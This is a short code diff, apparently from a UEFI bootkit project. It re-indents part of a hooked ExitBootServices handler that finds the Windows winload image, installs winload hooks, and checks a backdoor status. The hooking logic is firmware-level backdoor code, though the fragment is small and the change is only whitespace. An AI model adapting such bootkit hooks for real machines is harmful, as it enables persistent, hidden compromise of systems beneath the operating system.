@@ -359,16 +359,16 @@ EFI_STATUS EFIAPI new_ExitBootServices(
 
     if (m_WinloadBase == NULL)
     {        
-            VOID *WinloadBase = NULL;
+        VOID *WinloadBase = NULL;
 
-            // chcek if OpenProtocol() was called from the winload image
-            if ((WinloadBase = FindWinloadImage(ret_ExitBootServices)) != NULL)
-            {            
-                // set up winload hooks
-                WinloadHook(WinloadBase);
+        // chcek if OpenProtocol() was called from the winload image
+        if ((WinloadBase = FindWinloadImage(ret_ExitBootServices)) != NULL)
+        {            
+            // set up winload hooks
+            WinloadHook(WinloadBase);
 
-                m_WinloadBase = WinloadBase;
-            }
+            m_WinloadBase = WinloadBase;
+        }
     }
 
     switch (m_BackdoorInfo.Status)
